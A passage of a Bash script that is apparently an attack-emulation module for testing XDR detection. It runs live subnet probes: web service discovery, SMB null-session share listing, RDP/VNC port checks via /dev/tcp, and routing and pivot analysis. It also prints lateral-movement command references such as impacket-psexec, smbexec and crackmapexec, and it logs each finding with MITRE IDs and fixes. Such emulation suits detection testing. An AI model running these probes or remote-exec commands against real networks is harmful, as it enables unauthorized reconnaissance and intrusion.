                title=$(curl -s --max-time 3 -k "${proto}://${target}:${port}/" 2>/dev/null | grep -oP '<title>\K[^<]+' | head -1)
                echo -e "  ${G}  FOUND${N}  ${proto}://${target}:${port}/  ${D}HTTP ${code}${N}  ${LM_LIGHT}${title:-(no title)}${N}"
                csv_log "LM_WEB" "discovery" "${proto}://${target}:${port} ($code)" "OK"
            fi
        done
    done

    echo ""
    echo -e "  ${W}  COMMON INTERNAL SERVICES:${N}"
    echo -e "  ${D}    :3000  Grafana, Gitea       :8080  Jenkins, Tomcat${N}"
    echo -e "  ${D}    :9090  Prometheus            :9200  Elasticsearch${N}"
    echo -e "  ${D}    :5000  Docker Registry       :8888  Jupyter${N}"
    csv_log "LM_WEB" "probe" "complete" "OK"

    show_finding "MEDIUM" "Internal web services probed"
    write_finding "LM-11" "Web Discovery" "T1046" "EXECUTED" "MEDIUM" \
        "Internal web services probed" \
        "Segment internal services. Require authentication."
}

# ═══════════════════════════════════════════════════════════════════════════════
# LM 12: SMB/CIFS ENUMERATION
# ═══════════════════════════════════════════════════════════════════════════════
lm_attack_12() {
    lm_phase 12 "SMB/CIFS ENUMERATION & NULL SESSION" "T1021.002 Remote Services: SMB / T1135 Network Share Discovery"
    xdr "SMB share enumeration and null session testing"

    lm_explain "SMB Enumeration" \
        "Null session test on SMB port 445." \
        "Share listing reveals accessible data."
    lm_alert "SMB lateral movement probe"

    local -a smb_targets=()
    for h in "${LIVE_HOSTS[@]}"; do
        if timeout 2 bash -c "echo >/dev/tcp/${h}/445" 2>/dev/null; then
            smb_targets+=("$h")
        fi
    done

    if [[ ${#smb_targets[@]} -eq 0 ]]; then
        info "No SMB (445) targets found in subnet"
        csv_log "LM_SMB" "discovery" "no targets" "OK"
        # Still show technique reference
        echo -e "  ${W}  SMB LATERAL MOVEMENT TECHNIQUES:${N}"
        echo -e "  ${LM_BASE}    smbclient -L target -N${N}              ${D}(null session share list)${N}"
        echo -e "  ${LM_BASE}    smbclient //target/share -N${N}         ${D}(anonymous access)${N}"
        echo -e "  ${LM_BASE}    crackmapexec smb subnet/24${N}          ${D}(mass SMB recon)${N}"
        echo -e "  ${LM_BASE}    impacket-psexec user:pass@target${N}    ${D}(remote exec)${N}"
        echo -e "  ${LM_BASE}    impacket-smbexec user:pass@target${N}   ${D}(stealthy exec)${N}"
        return
    fi

    for target in "${smb_targets[@]:0:3}"; do
        lm_box_start "SMB — ${target}"
        hack "Null session attempt on ${target}..."
        if command -v smbclient &>/dev/null; then
            smbclient -L "$target" -N 2>/dev/null | while read l; do
                lm_box_line "  ${D}${l}${N}"
            done
        else
            lm_box_line "  ${D}smbclient not available${N}"
        fi
        lm_box_end
        csv_log "LM_SMB" "null_session" "$target" "OK"

    show_finding "MEDIUM" "SMB shares enumerated"
    write_finding "LM-12" "SMB Enum" "T1021.002" "EXECUTED" "MEDIUM" \
        "SMB shares enumerated" \
        "Disable null sessions. Restrict share access."
    done
}

# ═══════════════════════════════════════════════════════════════════════════════
# LM 13: RDP / VNC REACHABILITY PROBE
# ═══════════════════════════════════════════════════════════════════════════════
lm_attack_13() {
    lm_phase 13 "RDP / VNC REACHABILITY PROBE" "T1021.001 Remote Desktop Protocol / T1021.005 VNC"
    xdr "RDP and VNC service probing across subnet"

    lm_explain "RDP/VNC Probe" \
        "Remote desktop services on 3389 (RDP) and 5900 (VNC)." \
        "Open = potential credential-based lateral movement."
    lm_alert "Remote desktop protocol detection"

    hack "Probing for RDP (3389) and VNC (5900-5903)..."
    echo ""
    local rdp_count=0 vnc_count=0

    local -a check_hosts=("${LIVE_HOSTS[@]:-}")
    if [[ ${#check_hosts[@]} -eq 0 ]]; then
        local base; base=$(get_base)
        for o in $(seq 1 20); do
            local t="${base}.${o}"
            [[ "$t" != "$MY_IP" ]] && check_hosts+=("$t")
        done
    fi

    for target in "${check_hosts[@]:0:10}"; do
        # RDP
        if timeout 2 bash -c "echo >/dev/tcp/${target}/3389" 2>/dev/null; then
            echo -e "  ${R}  ⚠ RDP OPEN: ${target}:3389${N}"
            rdp_count=$((rdp_count + 1))
        fi
        # VNC
        for vport in 5900 5901 5902; do
            if timeout 2 bash -c "echo >/dev/tcp/${target}/${vport}" 2>/dev/null; then
                echo -e "  ${R}  ⚠ VNC OPEN: ${target}:${vport}${N}"
                vnc_count=$((vnc_count + 1))
            fi
        done
    done

    [[ $rdp_count -eq 0 && $vnc_count -eq 0 ]] && echo -e "  ${G}  ✔ No RDP/VNC services found${N}"
    result "RDP hosts: ${rdp_count} | VNC hosts: ${vnc_count}"
    csv_log "LM_RDP_VNC" "probe" "rdp=$rdp_count vnc=$vnc_count" "OK"

    show_finding "MEDIUM" "Remote desktop probed"
    write_finding "LM-13" "RDP/VNC" "T1021.001" "EXECUTED" "MEDIUM" \
        "Remote desktop probed" \
        "Use JIT access for RDP. Disable VNC if unused."

    echo ""
    echo -e "  ${W}  REMOTE DESKTOP LATERAL TECHNIQUES:${N}"
    echo -e "  ${LM_BASE}    xfreerdp /v:target /u:user /p:pass${N}     ${D}(RDP from Linux)${N}"
    echo -e "  ${LM_BASE}    rdesktop target${N}                        ${D}(legacy RDP)${N}"
    echo -e "  ${LM_BASE}    vncviewer target::5900${N}                 ${D}(VNC connect)${N}"
}

# ═══════════════════════════════════════════════════════════════════════════════
# LM 14: NETWORK ROUTE & GATEWAY PIVOT ANALYSIS
# ═══════════════════════════════════════════════════════════════════════════════
lm_attack_14() {
    lm_phase 14 "NETWORK ROUTE & GATEWAY PIVOT ANALYSIS" "T1018 Remote System Discovery / T1090 Proxy"
    xdr "Routing table and multi-subnet pivot analysis"

    lm_explain "Route & Gateway Analysis" \
        "Routing table, dual-homed interfaces, IP forwarding." \
        "Multi-subnet host = pivot between networks."
    lm_alert "Network route analysis for pivoting"

    run "Routing table..."
    echo ""
    lm_box_start "ROUTING TABLE"
    ip route 2>/dev/null | while read l; do lm_box_line "${D}${l}${N}"; done
    lm_box_end
    csv_log "LM_ROUTE" "table" "enumerated" "OK"

    echo ""
    run "Network interfaces with multiple subnets..."
    lm_box_start "INTERFACE ANALYSIS"
    ip -4 addr show 2>/dev/null | grep -E 'inet |mtu' | while read l; do
        lm_box_line "${LM_LIGHT}${l}${N}"
    done
    lm_box_end

    echo ""
    run "Checking for dual-homed interfaces (multi-subnet pivot)..."
    local iface_count
    iface_count=$(ip -4 addr show 2>/dev/null | grep -c 'inet ' || echo 0)
    if [[ $iface_count -gt 2 ]]; then
        echo -e "  ${R}  ⚠ DUAL-HOMED: ${iface_count} interfaces — machine can route between subnets${N}"
        csv_log "LM_ROUTE" "dual_homed" "$iface_count interfaces" "WARN"
    else
        echo -e "  ${G}  ✔ Single-homed (${iface_count} interfaces)${N}"
    fi

    echo ""
    run "Checking IP forwarding (router capability)..."
    local ipfwd; ipfwd=$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null || echo "?")
    if [[ "$ipfwd" == "1" ]]; then
        echo -e "  ${R}  ⚠ IP FORWARDING ENABLED — this host can route traffic${N}"
        csv_log "LM_ROUTE" "ip_forward" "enabled" "WARN"
    else
        echo -e "  ${G}  ✔ IP forwarding disabled${N}"
    fi

    echo ""
    run "Traceroute to gateway..."
    local gw; gw=$(ip route | grep default | awk '{print $3}' | head -1)
    if [[ -n "$gw" ]]; then
        echo -e "  ${W}  Gateway: ${gw}${N}"
        traceroute -m 5 -w 2 "$gw" 2>/dev/null | head -6 | while read l; do echo -e "  ${D}    ${l}${N}"; done
    fi
    csv_log "LM_ROUTE" "gateway" "$gw" "OK"

    show_finding "MEDIUM" "Network routes analyzed"
    write_finding "LM-14" "Route Analysis" "T1018" "EXECUTED" "MEDIUM" \
        "Network routes analyzed" \
        "Disable IP forwarding. Segment networks."
}

# ═══════════════════════════════════════════════════════════════════════════════
# LM 15: LATERAL MOVEMENT SUMMARY & ATTACK GRAPH
# ═══════════════════════════════════════════════════════════════════════════════
lm_attack_15() {
    lm_phase 15 "LATERAL MOVEMENT SUMMARY & ATTACK GRAPH" "N/A"

    echo ""
    lm_box_start "LATERAL MOVEMENT — ATTACK SURFACE"
    lm_box_line ""
    lm_box_line "${W}Source:${N}       ${MY_IP} ($(hostname))"
    lm_box_line "${W}Subnet:${N}      ${SUBNET}"
    lm_box_line "${W}Live hosts:${N}  ${#LIVE_HOSTS[@]}"
    lm_box_line "${W}SSH targets:${N} ${#SSH_HOSTS[@]}"
    lm_box_line ""

    if [[ ${#LIVE_HOSTS[@]} -gt 0 ]]; then
        lm_box_line "${W}DISCOVERED HOSTS:${N}"
        for h in "${LIVE_HOSTS[@]}"; do
            local ssh_flag="" smb_flag="" rdp_flag="" web_flag=""
            timeout 1 bash -c "echo >/dev/tcp/${h}/22" 2>/dev/null && ssh_flag=" SSH"
            timeout 1 bash -c "echo >/dev/tcp/${h}/445" 2>/dev/null && smb_flag=" SMB"
            timeout 1 bash -c "echo >/dev/tcp/${h}/3389" 2>/dev/null && rdp_flag=" RDP"
            timeout 1 bash -c "echo >/dev/tcp/${h}/80" 2>/dev/null && web_flag=" HTTP"
            lm_box_line "  ${LM_LIGHT}${h}${N}  →${G}${ssh_flag}${smb_flag}${rdp_flag}${web_flag}${N}"
        done
    else
        lm_box_line "${D}No live hosts discovered${N}"
    fi
    lm_box_line ""
    lm_box_line "${W}ATTACK GRAPH:${N}"
    lm_box_line "  ${LM_BASE}[${MY_IP}]${N} ──SSH──→ [${SSH_HOSTS[0]:-?}] ──pivot──→ [internal]"
    lm_box_line "  ${LM_BASE}[${MY_IP}]${N} ──SMB──→ [fileserver] ──shares──→ [credentials]"
    lm_box_line "  ${LM_BASE}[${MY_IP}]${N} ──HTTP─→ [webapp] ──exploit──→ [database]"
    lm_box_end

    show_finding "INFO" "Lateral movement: ${#LIVE_HOSTS[@]} hosts, ${#SSH_HOSTS[@]} SSH targets"
    write_finding "LM-15" "Lateral Summary" "N/A" "COMPLETE" "INFO" \
        "Hosts=${#LIVE_HOSTS[@]} SSH=${#SSH_HOSTS[@]} subnet=${SUBNET}" \
        "Review all lateral paths. Implement network segmentation."

    echo ""
    echo -e "${BG_LM}${W}                                                                              ${N}"
    echo -e "${BG_LM}${W}  ◆ DLC-04: LATERAL MOVEMENT — MODULE COMPLETE                                ${N}"
    echo -e "${BG_LM}${W}  ◆ Hosts: ${#LIVE_HOSTS[@]} alive | ${#SSH_HOSTS[@]} SSH | Subnet: ${SUBNET}                      ${N}"
    echo -e "${BG_LM}${W}                                                                              ${N}"
    echo ""
    echo -e "  ${LM_BASE}  MITRE: T1021 T1210 T1570 T1080 T1563 T1072 T1571 T1572 T1090 T1018${N}"
    echo ""
    echo -e "                              ${W}${BOLD}— X D R   C R E E P E R —${N}"
    echo ""
}

dlc_main() {
    module_splash "$DLC_NAME" "$DLC_DESC" "$DLC_MITRE" "$DLC_ATTACKS" "$DLC_RISK" "$DLC_ACCENT"
    CURRENT_MODULE="DLC-04-LATERAL"
    LIVE_HOSTS=(); SSH_HOSTS=(); get_my_ip
    lm_attack_01; lm_attack_02; lm_attack_03; lm_attack_04; lm_attack_05
    lm_attack_06; lm_attack_07; lm_attack_08; lm_attack_09; lm_attack_10
    lm_attack_11; lm_attack_12; lm_attack_13; lm_attack_14; lm_attack_15
}
